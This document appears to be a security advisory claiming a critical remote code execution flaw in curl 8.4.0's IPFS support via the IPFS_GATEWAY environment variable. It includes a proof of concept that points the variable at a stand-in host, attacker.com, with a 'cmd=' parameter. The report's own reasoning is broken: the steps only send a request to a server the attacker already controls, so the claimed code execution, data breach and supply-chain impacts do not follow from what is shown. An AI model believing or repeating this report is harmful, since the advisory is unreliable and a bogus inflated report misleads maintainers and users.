# Security Report: IPFS Protocol Support Vulnerability in curl-8.4.0

## 1. Executive Summary

This report details a critical vulnerability discovered in curl version 8.4.0 related to its IPFS (InterPlanetary File System) protocol support. The vulnerability, classified as CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'), allows for potential remote code execution through manipulation of environment variables. This poses a significant security risk to systems using the affected curl version.

## 2. Vulnerability Description

The vulnerability lies in the IPFS implementation within curl-8.4.0, specifically in the `ipfs_url_rewrite` function. This function uses an environment variable, `IPFS_GATEWAY`, to determine the IPFS gateway URL. However, the implementation fails to properly validate or sanitize this input, leading to potential security risks.

## 3. Technical Details

The `ipfs_url_rewrite` function in curl's IPFS implementation uses the `IPFS_GATEWAY` environment variable without proper validation. This variable is used to construct URLs for IPFS content retrieval. The function concatenates the gateway URL with the IPFS hash, creating a potential vector for injection attacks.

Key points:
- Function: `ipfs_url_rewrite`
- Vulnerable environment variable: `IPFS_GATEWAY`
- Issue: Lack of input validation and sanitization

## 4. Proof of Concept

A proof of concept exploit has been developed to demonstrate the vulnerability:

1. Set the `IPFS_GATEWAY` environment variable to a malicious value:
   ```
   export IPFS_GATEWAY="http://attacker.com/exec?cmd="
   ```

2. Make a curl request to an IPFS resource:
   ```
   curl ipfs://QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco/wiki/Denmark.html
   ```

3. The resulting URL becomes:
   ```
   http://attacker.com/exec?cmd=QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco/wiki/Denmark.html
   ```

This allows an attacker to potentially execute arbitrary commands on the server hosting the malicious gateway.

## 5. Impact Analysis

The impact of this vulnerability is severe:

1. Remote Code Execution: Attackers can potentially execute arbitrary code on affected systems.
2. Data Breach: Sensitive information could be exfiltrated from compromised systems.
3. System Compromise: Full system takeover is possible if the curl process has elevated privileges.
4. Supply Chain Attacks: If exploited in automated systems or build processes, it could lead to widespread compromise.

## 6. Recommendations for Mitigation

To address this vulnerability, we recommend the following actions:

1. Immediate Upgrade: Update to the latest version of curl that has patched this vulnerability.
2. Input Validation: Implement strict input validation for the `IPFS_GATEWAY` environment variable.
3. Sanitization: Sanitize the input before using it in URL construction.
4. Default Gateway: Consider hardcoding a default, trusted IPFS gateway URL.
5. Principle of Least Privilege: Ensure curl processes run with minimal necessary permissions.
6. Environment Variable Control: Restrict the ability to set or modify the `IPFS_GATEWAY` variable in production environments.

## 7. Conclusion

The IPFS Protocol Support Vulnerability in curl-8.4.0 represents a significant security risk. It highlights the importance of thorough input validation, especially when dealing with externally-controlled data such as environment variables. Organizations using curl, particularly in automated systems or build processes, should treat this issue with high priority and implement the recommended mitigations promptly.

Continuous security audits and following secure coding practices are crucial in preventing similar vulnerabilities in the future. As the use of decentralized protocols like IPFS grows, extra caution must be taken to ensure their secure implementation in widely-used tools like curl.
